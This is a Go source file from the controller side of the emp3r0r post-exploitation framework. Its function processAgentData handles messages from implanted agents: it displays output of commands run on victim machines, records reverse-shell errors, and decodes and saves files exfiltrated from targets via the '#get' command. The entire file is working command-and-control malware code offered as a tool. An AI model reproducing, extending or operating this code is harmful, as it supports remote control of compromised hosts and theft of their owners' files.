package cc

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// processAgentData deal with data from agent side
func processAgentData(data *agent.MsgTunData) {
	payloadSplit := strings.Split(data.Payload, agent.OpSep)
	op := payloadSplit[0]

	agent := GetTargetFromTag(data.Tag)
	contrlIf := Targets[agent]

	switch op {

	// cmd output from agent
	case "cmd":
		cmd := payloadSplit[1]
		out := strings.Join(payloadSplit[2:], " ")
		outLines := strings.Split(out, "\n")

		// headless mode
		if IsHeadless {
			// send to socket
			var resp APIResponse
			msg := fmt.Sprintf("%s:\n%s", cmd, out)
			resp.Cmd = cmd
			resp.MsgData = []byte(msg)
			resp.Alert = false
			resp.MsgType = CMD
			data, err := json.Marshal(resp)
			if err != nil {
				log.Printf("processAgentData cmd output: %v", err)
				return
			}
			_, err = APIConn.Write([]byte(data))
			if err != nil {
				log.Printf("processAgentData cmd output: %v", err)
			}
		}

		// if cmd is `bash`, our shell is likey broken
		if strings.HasPrefix(cmd, "bash") {
			shellToken := strings.Split(cmd, " ")[1]
			RShellStatus[shellToken] = fmt.Errorf("Reverse shell error: %v", out)
		}

		// ls command
		if strings.HasPrefix(cmd, "ls") {
			var dents []util.Dentry
			err = json.Unmarshal([]byte(out), &dents)
			if err != nil {
				CliPrintError("ls: %v:\n%s", err, out)
				return
			}

			ds := ""
			for _, d := range dents {
				ds += color.BlueString("%s%s: %s, %s, %s\n", strings.Repeat(" ", 15), d.Name, d.Ftype, d.Size, d.Permission)
			}
			CliPrintInfo("Listing current path:\n%s", ds)
			return
		}

		// optimize output
		if len(outLines) > 20 {
			t := time.Now()
			logname := fmt.Sprintf("%scmd-%d-%02d-%02dT%02d:%02d:%02d.log",
				Temp,
				t.Year(), t.Month(), t.Day(),
				t.Hour(), t.Minute(), t.Second())

			CliPrintInfo("Output will be displayed in new window")
			err := ioutil.WriteFile(logname, []byte(out), 0600)
			if err != nil {
				CliPrintWarning(err.Error())
			}

			viewCmd := fmt.Sprintf(`less -f -r %s`,
				logname)

			// split window vertically
			if err = TmuxSplit("v", viewCmd); err == nil {
				CliPrintSuccess("View result in new window (press q to quit)")
				return
			}
			CliPrintError("Failed to opent tmux window: %v", err)
		}

		log.Printf("\n[%s] %s:\n%s\n\n", color.CyanString("%d", contrlIf.Index), color.HiMagentaString(cmd), color.HiWhiteString(out))

	// save file from #get
	case "FILE":
		filepath := payloadSplit[1]

		// we only need the filename
		filename := FileBaseName(filepath)

		b64filedata := payloadSplit[2]
		filedata, err := base64.StdEncoding.DecodeString(b64filedata)
		if err != nil {
			CliPrintError("processAgentData failed to decode file data: %v", err)
			return
		}

		// save to /tmp for security
		if _, err := os.Stat(FileGetDir); os.IsNotExist(err) {
			err = os.MkdirAll(FileGetDir, 0700)
			if err != nil {
				CliPrintError("mkdir -p /tmp/emp3r0r/file-get: %v", err)
				return
			}
		}
		err = ioutil.WriteFile(FileGetDir+filename, filedata, 0600)
		if err != nil {
			CliPrintError("processAgentData failed to save file: %v", err)
			return
		}

	default:
	}
}
